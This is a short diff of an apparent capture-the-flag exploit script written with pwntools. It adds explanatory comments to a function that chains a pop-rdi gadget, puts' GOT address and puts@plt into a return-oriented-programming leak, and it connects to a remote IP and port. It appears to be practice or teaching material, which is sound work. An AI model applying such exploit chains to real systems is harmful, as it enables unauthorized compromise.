@@ -51,9 +51,9 @@ continue
 
 
 def leak():
-    pop_rdi = 0x4013e3
-    plt_puts = 0x4010b0
-    return p64(pop_rdi) + p64(0x404018) + p64(plt_puts)
+    pop_rdi = 0x4013e3 #find rdi=0x1
+    plt_puts = 0x4010b0 #objdump of binary puts@plt
+    return p64(pop_rdi) + p64(0x404018) + p64(plt_puts) # 0x404018 is puts got, also get using objdump of binary 
 
 # io = start()
 io = remote('107.21.135.41', 6666)
